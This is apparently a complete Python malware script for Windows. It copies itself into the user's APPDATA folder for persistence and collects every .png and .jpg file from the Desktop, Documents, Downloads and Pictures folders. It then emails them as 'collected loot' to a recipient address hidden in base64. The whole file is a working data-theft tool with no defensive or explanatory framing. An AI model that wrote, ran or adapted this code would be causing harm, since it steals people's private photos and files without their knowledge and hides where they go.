
import os


if not os.name == 'nt':
    exit()

from shutil import copy
from EmailSender import *
from os import path, getcwd, scandir, getenv
from sys import platform
from base64 import b64decode
from sys import exit
import imghdr
from time import sleep
from itertools import chain

startUpShell = getenv("APPDATA")
user = getenv("USERPROFILE")


profilePATHS = [
    f"{user}\\{i}" for i in ['Desktop', 'Documents', 'Downloads', 'pictures']
]


EMAIL_ADRESS = getenv('EMAIL')
PASSWORD = getenv('PASSWORD')

class _Installer:
    try:
        currentDir = "\\".join(__file__.split('\\')[:-1])
    except:
        try:
            currentDir = getcwd()
        except:
            exit(1)
    if platform == 'win32':
        if currentDir != startUpShell:
            copy(__file__, startUpShell)

class Sender:
    def __init__(self, currentdir: str = '.'):
        self.currentdir = currentdir
        self.Sender = EmailSender(EMAIL_ADRESS, PASSWORD, Debug=False)
        self.headers = {
        "subject": "Crypt0101, Exploit0101",
        "to": b64decode(b"YXptb3VkaEBnbWFpbC5jb20=").decode("utf-8"),
        "Content": "collected loot"
        }
        self.Sender.setMessage(self.headers["subject"], self.headers["to"], self.headers["Content"])
        self.img = self.scanner
        if len(self.img) < 1:
            exit()
        else:
            if len(self.img) == 1:
                with open(self.img[0].name, 'rb') as f:
                    file_data = f.read()
                    file_type =  self.img[0].name.split('.')[1]
                    file_name = f.name
                self.Sender.msg.add_attachment(file_data, maintype="image", subtype=file_type, filename=file_name)
                self.Sender.send()
            else:
                for _ in self.img:
                    with open(_.path, 'rb') as f:
                        file_data = f.read()
                        file_type = _.name.split('.')[1]
                        file_name = f.name
                    self.Sender.msg.add_attachment(file_data, maintype="image", subtype=file_type, filename=file_name)
                    print(f'added {_.name}')
                print("sending...")
                self.sendALL()
            exit(0)

    def sendALL(self):
        self.Sender.send()
        print("sent//")

    @property
    def scanner(self):
        return list(chain.from_iterable([[i for i in scandir(_) if i.name.endswith('.png') or i.name.endswith('.jpg')] for _ in profilePATHS if path.exists(_)]))



list(chain.from_iterable([[i for i in scandir(_) if i.name.endswith('.png') or i.name.endswith('.jpg')] for _ in profilePATHS if path.exists(_)]))

def main(): #{
    ctx = Sender()
#}
if __name__ == '__main__':
    main()

# for i in profilePATHS:
#     print(str(i))
#     for _ in scandir(i):
#         if _.name.endswith("png"):
#             print(f"\t{_.name}")